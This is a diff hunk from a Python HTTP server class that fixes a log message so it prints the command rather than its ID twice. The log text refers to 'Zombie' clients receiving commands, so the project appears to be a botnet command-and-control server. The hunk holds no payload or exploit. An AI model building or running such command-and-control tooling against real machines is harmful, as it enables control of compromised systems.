@@ -245,7 +245,7 @@ class WebServer(BaseHTTPRequestHandler):
             terminalLogger.log(
                 'Zombie {} Sent Get Request ---> Command : ({}) '
                 'with Command ID : ({}) Sent.'
-                    .format(client_address, __command_id, __command_id)
+                    .format(client_address, __command, __command_id)
             )
 
             # if command starts with : #special_command:!   it is a special command like:
